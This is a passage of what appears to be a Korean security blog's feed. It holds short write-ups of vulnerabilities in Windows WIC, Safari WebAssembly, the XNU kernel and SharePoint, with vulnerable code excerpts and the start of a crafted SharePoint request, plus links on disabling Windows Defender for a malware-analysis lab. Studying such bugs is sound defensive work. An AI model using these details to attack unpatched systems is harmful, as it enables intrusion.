&#xC791;&#xC5C5; &#xD45C;&#xC2DC;&#xC904;&#xC5D0; &#xCD94;&#xAC00;, &#xBC14;&#xD0D5;&#xD654;&#xBA74; &#xBC14;&#xB85C;&#xAC00;&#xAE30; &#xB9CC;&#xB4E4;&#xAE30; &#xB4F1;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;. &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xAC00; &#xBAA8;&#xB450; &#xC9C4;&#xD589;&#xB418;&#xACE0; &#xB098;&#xBA74; &#xC804;&#xCCB4; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB97C; github&#xC5D0; &#xC62C;&#xB824;&#xC11C; &#xB9C1;&#xD06C;&#xB97C; &#xAC78;&#xC5B4;&#xB4DC;&#xB9AC;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xAD6C;&#xD604;&#xD560; &#xB54C; &#xCC38;&#xACE0; &#xB9C1;&#xD06C;&#xB4E4;&#xC744; &#xC791;&#xC131;&#xD558;&#xBA70; &#xC774;&#xB9CC; &#xBB3C;&#xB7EC;&#xAC00;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xC548;&#xB1FD;~</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>disable security maintenance icon: <a href="https://admx.help/?Category=Windows_10_2016&amp;Policy=Microsoft.Policies.TaskBar2::HideSCAHealth">https://admx.help/?Category=Windows_10_2016&amp;Policy=Microsoft.Policies.TaskBar2::HideSCAHealth</a></p><p>show hidden files: <a href="https://www.python2.net/questions-1237399.htm">https://www.python2.net/questions-1237399.htm</a></p><p>remove app list: <a href="https://community.spiceworks.com/topic/2230169-powershell-script-to-remove-xbox-gamebar-from-the-app-list">https://community.spiceworks.com/topic/2230169-powershell-script-to-remove-xbox-gamebar-from-the-app-list</a></p><p>disable windows defender: <a href="https://github.com/fireeye/flare-vm/blob/master/install.ps1">https://github.com/fireeye/flare-vm/blob/master/install.ps1</a></p><p>disable windows update: <a href="https://social.technet.microsoft.com/Forums/lync/en-US/abde2699-0d5a-49ad-bfda-e87d903dd865/disable-windows-update-via-powershell?forum=winserverpowershell">https://social.technet.microsoft.com/Forums/lync/en-US/abde2699-0d5a-49ad-bfda-e87d903dd865/disable-windows-update-via-powershell?forum=winserverpowershell</a></p><p>get specific sid: <a href="https://techexpert.tips/powershell/powershell-get-user-sid/">https://techexpert.tips/powershell/powershell-get-user-sid/</a></p><p>remove all registry key under specific key: <a href="https://docs.microsoft.com/ko-kr/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.1#removing-all-keys-under-a-specific-key">https://docs.microsoft.com/ko-kr/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.1#removing-all-keys-under-a-specific-key</a></p><p>remove task: <a href="https://community.spiceworks.com/how_to/159324-delete-scheduled-task-with-powershell">https://community.spiceworks.com/how_to/159324-delete-scheduled-task-with-powershell</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>powershell</tag>
      
      <tag>automated</tag>
      
      <tag>virtual machine</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows: Out-of-bounds write in WindowsCodecsRaw!COlympusE300LoadRaw</title>
    <link href="/2021/06/06/j0ker/2021-06-06/"/>
    <url>/2021/06/06/j0ker/2021-06-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2137&amp;q=&amp;can=1&amp;sort=-reported">Issue 2137: Windows: Out-of-bounds write in WindowsCodecsRaw!COlympusE300LoadRaw</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10 20H1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows&#xC5D0;&#xC11C;&#xB294; Olympus E300&#xC758; raw &#xC774;&#xBBF8;&#xC9C0; &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB54C;, <code>Windows Imaging Component (WIC)</code>&#xB97C; &#xD1B5;&#xD574; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; <code>WindowsCodecsRaw.dll</code>&#xC758; <code>COlympusE300LoadRaw::olympus_e300_load_raw()</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xD568;&#xC218;&#xC758; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> CLASS <span class="hljs-title">olympus_e300_load_raw</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{  uchar  *data,  *dp;  ushort *pixel, *pix;  <span class="hljs-keyword">int</span> dwide, row, col;  dwide = raw_width * <span class="hljs-number">16</span> / <span class="hljs-number">10</span>;               <span class="hljs-comment">// (1)</span>  data = <span class="hljs-built_in">malloc</span> (dwide + raw_width*<span class="hljs-number">2</span>);  merror (data, <span class="hljs-string">&quot;olympus_e300_load_raw()&quot;</span>);  pixel = (ushort *) (data + dwide);  <span class="hljs-keyword">for</span> (row=<span class="hljs-number">0</span>; row &lt; height; row++) {    fread (data, <span class="hljs-number">1</span>, dwide, ifp);    <span class="hljs-keyword">for</span> (dp=data, pix=pixel; pix &lt; pixel+raw_width; dp+=<span class="hljs-number">3</span>, pix+=<span class="hljs-number">2</span>) {  <span class="hljs-comment">//  (2)</span>      <span class="hljs-keyword">if</span> (((dp-data) &amp; <span class="hljs-number">15</span>) == <span class="hljs-number">15</span>) dp++;      pix[<span class="hljs-number">0</span>] = dp[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span> | dp[<span class="hljs-number">0</span>];                                    <span class="hljs-comment">// (3)</span>      pix[<span class="hljs-number">1</span>] = dp[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">4</span> | dp[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">4</span>;                               <span class="hljs-comment">// (4)</span>    }    <span class="hljs-keyword">for</span> (col=<span class="hljs-number">0</span>; col &lt; width; col++)      BAYER(row,col) = (pixel[col] &amp; <span class="hljs-number">0xfff</span>);  }  <span class="hljs-built_in">free</span> (data);}</code></pre><p>&#xBA3C;&#xC800; (1)&#xC5D0;&#xC11C; &#xB514;&#xCF54;&#xB529;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD560; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xB514;&#xCF54;&#xB529;&#xC740; &#xC5F4; &#xB2E8;&#xC704;&#xB85C; &#xB514;&#xCF54;&#xB529;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB294;&#xB370;, &#xD55C; &#xC5F4;&#xC5D0;&#xB294; <code>height</code>&#xB9CC;&#xD07C;&#xC758; &#xD53D;&#xC140;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xBA70; &#xD53D;&#xC140;&#xC740; &#xAC01;&#xAC01; 2 bytes&#xC758; &#xB370;&#xC774;&#xD130;&#xB85C; &#xB514;&#xCF54;&#xB529; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; (2)&#xC5D0;&#xC11C;&#xBD80;&#xD130; &#xC2E4;&#xC9C8;&#xC801;&#xC778; &#xB514;&#xCF54;&#xB529; &#xC791;&#xC5C5;&#xC774; &#xC9C4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xC870;&#xAC74;&#xBB38;&#xC744; <code>pix &lt; pixel+raw_width</code>&#xB85C; &#xC124;&#xC815;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xB514;&#xCF54;&#xB529; &#xACFC;&#xC815;&#xC5D0;&#xC11C; OOB&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC2E0;&#xACBD;&#xC37C;&#xC9C0;&#xB9CC; <code>raw_width</code>&#xAC00; <code>0xd79</code>&#xAC19;&#xC774; &#xD640;&#xC218;&#xC77C; &#xACBD;&#xC6B0;, &#xD55C; &#xD53D;&#xC140; &#xB2F9; 2 bytes &#xC529; &#xB514;&#xCF54;&#xB4DC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; loop&#xC758; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0;&#xC11C; (3)&#xC5D0;&#xC11C;&#xB294; &#xBC84;&#xD37C;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F0;&#xC9C0;&#xB9CC; (4)&#xC5D0;&#xC11C; &#xBC84;&#xD37C; &#xBC16;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F0;&#xAC8C; &#xB418;&#xC5B4; 1 byte &#xC758; OOB Write&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>oob</tag>
      
      <tag>windows</tag>
      
      <tag>j0ker</tag>
      
      <tag>microsoft</tag>
      
      <tag>WindowsCodecsRaw</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-30734: Safari WebAssembly LLInt에서 발견된 Integer Overflow 취약점</title>
    <link href="/2021/06/05/fabu1ous/2021-06-05/"/>
    <url>/2021/06/05/fabu1ous/2021-06-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.ret2.io/2021/06/02/pwn2own-2021-jsc-exploit/">Exploitation of a JavaScriptCore WebAssembly Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Safari &lt;14.1.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Safari&#xC758; WebAssembly&#xB294; &#xC138; &#xB2E8;&#xACC4;&#xB97C; &#xAC70;&#xCCD0; &#xC2E4;&#xD589;&#xB418;&#xB294;&#xB370; &#xADF8; &#xCCAB; &#xBC88;&#xC9F8; &#xB2E8;&#xACC4;&#xC778; LLInt(Low Level Interpreter)&#xC5D0; interger overflow &#xCDE8;&#xC57D;&#xC810;(CVE-2021-30734)&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC; Safari 14.1.1 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. LLInt&#xC758; Parser&#xB294; &#xD568;&#xC218;&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>m_max_StackSize</code> &#xD544;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD568;&#xC218;&#xAC00; &#xC0AC;&#xC6A9;&#xD560; &#xC2A4;&#xD0DD;&#xC758; &#xCD5C;&#xB300; &#xD06C;&#xAE30;&#xB97C; &#xCD94;&#xC801;&#xD569;&#xB2C8;&#xB2E4;. &#xD30C;&#xC2F1;&#xC774; &#xB05D;&#xB098;&#xBA74; <code>m_max_StackSize</code> &#xAC12;&#xC744; 16 byte alignment&#xB85C; &#xB9DE;&#xCD94;&#xAE30; &#xC704;&#xD574; <code>LLIntGenerator::Finalize</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xBC18;&#xC62C;&#xB9BC;&#xD558;&#xACE0; <code>m_numCalleeLocals</code> &#xD544;&#xB4DC;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xB9CC;&#xC57D; <code>m_max_StackSize</code> &#xAC12;&#xC774; <code>0xffffffff</code>&#xC774;&#xB77C;&#xBA74; 16 byte alignment&#xB97C; &#xB9DE;&#xCD94;&#xAE30; &#xC704;&#xD574; &#xC62C;&#xB9BC; &#xACC4;&#xC0B0;&#xC744; &#xD558;&#xAC8C; &#xB418;&#xC5B4; integer overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; <code>m_numCalleeLocals</code>&#xC758; &#xAC12;&#xC774; <code>0x0</code>&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC2A4;&#xD0DD;&#xC758; &#xD06C;&#xAE30;&#xC640; LLInt&#xAC00; &#xCD94;&#xC801;&#xD558;&#xB294; &#xD06C;&#xAE30;&#xAC00; &#xC11C;&#xB85C; &#xB2EC;&#xB77C;&#xC9C0;&#xAC8C; &#xB418;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC; &#xC624;&#xC5FC;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>safari</tag>
      
      <tag>wasm</tag>
      
      <tag>int overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-30660: macOS 및 iOS의 커널 메모리 유출 취약점</title>
    <link href="/2021/06/04/l0ch/2021-06-04/"/>
    <url>/2021/06/04/l0ch/2021-06-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://alexplaskett.github.io/CVE-2021-30660/">CVE-2021-30660 - XNU Kernel Memory Disclosure</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="https://support.apple.com/en-us/HT212325">macOS 11.3 &#xC774;&#xC804; release</a></li><li><a href="https://support.apple.com/en-us/HT212317">iOS 14.5 &#xC774;&#xC804; release</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apple&#xC0AC;&#xC758; macOS &#xBC0F; iOS&#xC758; XNU &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>XNU&#xC758; syscall <code>SYS_msgsnd_nocancel</code> &#xC758; &#xD578;&#xB4E4;&#xB7EC;&#xC778; <a href="https://opensource.apple.com/source/xnu/xnu-1504.7.4/bsd/kern/sysv_msg.c.auto.html">sysv_msg.c/msgrcv_nocancel()</a> &#xB294; &#xC720;&#xC800; &#xACF5;&#xAC04;&#xC758; &#xBA54;&#xC2DC;&#xC9C0; &#xD06C;&#xAE30;&#xB97C; <code>msgsz</code>&#xB85C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC720;&#xC800; &#xACF5;&#xAC04;&#xC5D0;&#xC11C; &#xC694;&#xCCAD;&#xB41C; &#xD06C;&#xAE30;&#xAC00; &#xCD08;&#xAE30;&#xC5D0; &#xCEE4;&#xB110;&#xC5D0; &#xC804;&#xC1A1;&#xB41C; &#xD06C;&#xAE30; <code>msghdr&#x2192;msg_ts</code>&#xBCF4;&#xB2E4; &#xD06C;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>msghdr&#x2192;msg_ts</code>&#xB85C; &#xC790;&#xB985;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (msgsz &gt; msghdr-&gt;msg_ts) {msgsz = msghdr-&gt;msg_ts;}</code></pre><p>&#xC774;&#xD6C4; &#xC544;&#xB798;&#xC758; &#xBC18;&#xBCF5;&#xBB38;&#xC744; &#xB3CC;&#xBA70; &#xCEE4;&#xB110; <code>msgpool</code>&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xC800; &#xACF5;&#xAC04;&#xC73C;&#xB85C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">1</span><span class="hljs-comment">// msg.h</span><span class="hljs-number">2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSGSSZ8<span class="hljs-comment">/* Each segment must be 2^N long */</span></span><span class="hljs-number">3</span><span class="hljs-number">4</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">msginit</span><span class="hljs-params">(__unused <span class="hljs-keyword">void</span> *dummy)</span></span>{<span class="hljs-number">5</span><span class="hljs-keyword">if</span> (i != msginfo.msgssz) {<span class="hljs-number">6</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;msginfo.msgssz=%d (0x%x) not a small power of 2; resetting to %d\\n&quot;</span>, msginfo.msgssz, msginfo.msgssz, MSGSSZ); <span class="hljs-number">7</span>msginfo.msgssz = MSGSSZ;<span class="hljs-number">8</span>}<span class="hljs-number">9</span>...<span class="hljs-number">10</span><span class="hljs-number">11</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">msgsnd_nocancel</span><span class="hljs-params">(struct proc *p, struct msgsnd_nocancel_args *uap, <span class="hljs-keyword">int32_t</span> *retval)</span></span>{<span class="hljs-number">12</span>...<span class="hljs-number">13</span><span class="hljs-keyword">for</span> (len = <span class="hljs-number">0</span>; len &lt; msgsz; len += msginfo.msgssz) {<span class="hljs-number">14</span><span class="hljs-keyword">size_t</span> tlen;<span class="hljs-number">15</span><span class="hljs-comment">/* compare input (size_t) value against restrict (int) value */</span><span class="hljs-number">16</span><span class="hljs-keyword">if</span> (msgsz &gt; (<span class="hljs-keyword">size_t</span>)msginfo.msgssz) {<span class="hljs-number">17</span>tlen = msginfo.msgssz;<span class="hljs-number">18</span>} <span class="hljs-keyword">else</span> {<span class="hljs-number">19</span>tlen = msgsz;<span class="hljs-number">20</span>}<span class="hljs-number">21</span><span class="hljs-keyword">if</span> (next &lt;= <span class="hljs-number">-1</span>) {<span class="hljs-number">22</span>panic(<span class="hljs-string">&quot;next too low #3&quot;</span>);<span class="hljs-number">23</span>}<span class="hljs-number">24</span><span class="hljs-keyword">if</span> (next &gt;= msginfo.msgseg) {<span class="hljs-number">25</span>panic(<span class="hljs-string">&quot;next out of range #3&quot;</span>);<span class="hljs-number">26</span>}<span class="hljs-number">27</span>SYSV_MSG_SUBSYS_UNLOCK();<span class="hljs-number">28</span>eval = copyout(&amp;msgpool[next * msginfo.msgssz], user_msgp, tlen);<span class="hljs-number">29</span>...</code></pre><p>&#xBC18;&#xBCF5;&#xBB38;&#xC758; &#xC99D;&#xAC00; &#xAC12;&#xC778; <code>msginfo.msgssz</code>&#xB294; <code>msginit()</code>&#xC5D0;&#xC11C; <code>#define MSGSSZ 8</code> &#xB85C; &#xC120;&#xC5B8;&#xB41C; <code>MSGSSZ</code>&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC5B4; &#xD2B9;&#xC815; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xBA74; <code>8 bytes</code> &#xB2E8;&#xC704;&#xB85C; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC720;&#xC800; &#xACF5;&#xAC04;&#xC5D0; &#xBCF5;&#xC0AC;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xC694;&#xCCAD;&#xB41C; &#xD06C;&#xAE30;&#xAC00; 8&#xC758; &#xBC30;&#xC218;&#xAC00; &#xC544;&#xB2D0; &#xACBD;&#xC6B0; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; <code>1~7 bytes</code> &#xD06C;&#xAE30;&#xC758; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC720;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>9 bytes</code> &#xD06C;&#xAE30;&#xC758; <code>SYS_msgsnd_nocancel</code> syscall&#xC744; &#xBCF4;&#xB0BC; &#xACBD;&#xC6B0; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;.</p><ol><li><code>msghdr&#x2192;msg_ts</code>&#xC640; <code>msgsz</code>&#xAC00; 9&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</li><li>line 16&#xC758; &#xC870;&#xAC74;&#xBB38;&#xC5D0; &#xC758;&#xD574;  <code>tlen</code>&#xC774; 8&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</li><li><code>8 bytes</code> &#xB2E8;&#xC704;&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xB294; &#xBC18;&#xBCF5;&#xBB38;&#xC744; &#xB450; &#xBC88; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>16 bytes</code>&#xC758; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC720;&#xC800; &#xACF5;&#xAC04;&#xC73C;&#xB85C; &#xBCF5;&#xC0AC;&#xB418;&#xC5B4; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; <code>7 bytes</code> &#xD06C;&#xAE30;&#xC758; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC720;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>information disclosure</tag>
      
      <tag>kernel</tag>
      
      <tag>ios</tag>
      
      <tag>apple</tag>
      
      <tag>L0ch</tag>
      
      <tag>macos</tag>
      
      <tag>xnu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31181: Microsoft SharePoint 원격 코드 실행 취약점</title>
    <link href="/2021/06/03/idioth/2021-06-03/"/>
    <url>/2021/06/03/idioth/2021-06-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability">CVE-2021-31181: MICROSOFT SHAREPOINT WEBPART INTERPRETATION CONFLICT REMOTE CODE EXECUTION VULNERABILITY</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2021&#xB144; 5&#xC6D4; 11&#xC77C; &#xB9B4;&#xB9AC;&#xC2A4; &#xC774;&#xC804; &#xBC84;&#xC804;&#xC758; Microsoft SharePoint<ul><li>Foundation 2013 Service Pack 1</li><li>Server 2019</li><li>Enterprise Server 2016</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft SharePoint&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; SharePoint&#xC758; &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815; context&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; 5&#xC6D4;&#xC5D0; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>EditingPageParser.VerifyControlOnSafeList()</code> &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825; &#xAC12; &#xAC80;&#xC99D; &#xBBF8;&#xD761;&#xC73C;&#xB85C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xBA54;&#xC18C;&#xB4DC;&#xB294; unsafe controls &#xB9AC;&#xC2A4;&#xD2B8;&#xC640; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC785;&#xB825; &#xAC12;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xC5EC; &#xD655;&#xC778;&#xD558;&#xBA70; <code>web.config</code>&#xC5D0; &#xC9C0;&#xC815;&#xB41C; <code>SafeControl</code>&#xC5D0; &#xC758;&#xD574; &#xC548;&#xC804;&#xD55C; &#xCEE8;&#xD2B8;&#xB864;&#xC774; &#xC5C6;&#xB294; &#xACBD;&#xC6B0; &#xC608;&#xC678;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. <code>EditingPageParser.ParseStringInternal()</code>&#xC740; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825; &#xAC12;(<code>dscXml</code>)&#xC744; &#xAD6C;&#xBB38; &#xBD84;&#xC11D;&#xD558;&#xACE0; <code>hashtable</code>&#xC744; Register directive &#xC815;&#xBCF4;&#xB85C; &#xCC44;&#xC6B4; &#xB2E4;&#xC74C; &#xC11C;&#xBC84; &#xCEE8;&#xD2B8;&#xB864;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xD0DC;&#xADF8;&#xB85C; <code>hashtable2</code>&#xB97C; &#xCC44;&#xC6C1;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; <code>hashtable2</code>&#xC758; &#xAC01; &#xC694;&#xC18C;&#xC5D0; &#xB300;&#xD574; <code>Type</code> &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; <code>SafeControls</code>&#xC758; allowed list&#xC640; &#xBE44;&#xAD50;&#xD558;&#xC5EC; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <code>Type</code>&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC5C6;&#xC744; &#xB54C; &#xC11C;&#xBC84; &#xCEE8;&#xD2B8;&#xB864; &#xD0DC;&#xADF8;&#xAC00; &#xBB34;&#xC2DC;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; <code>WebPartPagesWebService.RenderWebPartForEdit</code> &#xC6F9; API &#xBA54;&#xC18C;&#xB4DC;&#xB85C; <code>/_vti_bin/webPartPages.asmx</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>aspx</code>&#xB97C; &#xC785;&#xB825; &#xAC12;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>EditPageParser.VerifyControlOnSafeList</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD655;&#xC778; &#xD6C4; unsafe element&#xAC00; &#xC5C6;&#xC73C;&#xBA74; &#xB514;&#xC790;&#xC778; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xB9C8;&#xD06C;&#xC5C5;&#xC744; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>RenderWebPartForEdit</code>&#xC758; request&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%@</span> <span class="hljs-attr">Register</span> <span class="hljs-attr">TagPrefix</span>=<span class="hljs-string">&quot;WebPartPages&quot;</span> 